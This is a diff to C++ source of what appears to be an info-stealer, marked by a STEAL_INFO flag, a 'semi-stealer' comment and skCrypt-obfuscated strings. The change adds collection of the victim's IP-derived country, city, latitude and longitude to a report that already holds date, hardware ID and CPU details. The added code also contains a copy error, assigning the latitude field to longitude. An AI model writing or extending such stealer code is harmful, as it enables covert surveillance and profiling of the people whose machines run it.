@@ -67,7 +67,12 @@ int main(int argc, char* argv[])
     if (STEAL_INFO) { //User infos = semi-stealer
         infoFileContent += (string)skCrypt("Date: ") + getDate() + (string)skCrypt("\n");
         infoFileContent += (string)skCrypt("HWID: ") + getHWID() + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("IP: ") + getIP() + (string)skCrypt("\n");
+        vector<string> ipData = split(getIPData(), '\n');
+        infoFileContent += (string)skCrypt("IP: ") + ipData[0] + (string)skCrypt("\n");
+        infoFileContent += (string)skCrypt("Country: ") + ipData[1] + (string)skCrypt("\n");
+        infoFileContent += (string)skCrypt("City: ") + ipData[2] + (string)skCrypt("\n");
+        infoFileContent += (string)skCrypt("Latitude: ") + ipData[3] + (string)skCrypt("\n");
+        infoFileContent += (string)skCrypt("Longitude: ") + ipData[3] + (string)skCrypt("\n");
         vector<string> systemData = split(getCPU(), '\n');
         infoFileContent += (string)skCrypt("CPU name: ") + systemData[0] + (string)skCrypt("\n");
         infoFileContent += (string)skCrypt("CPU threads: ") + systemData[1] + (string)skCrypt("\n");
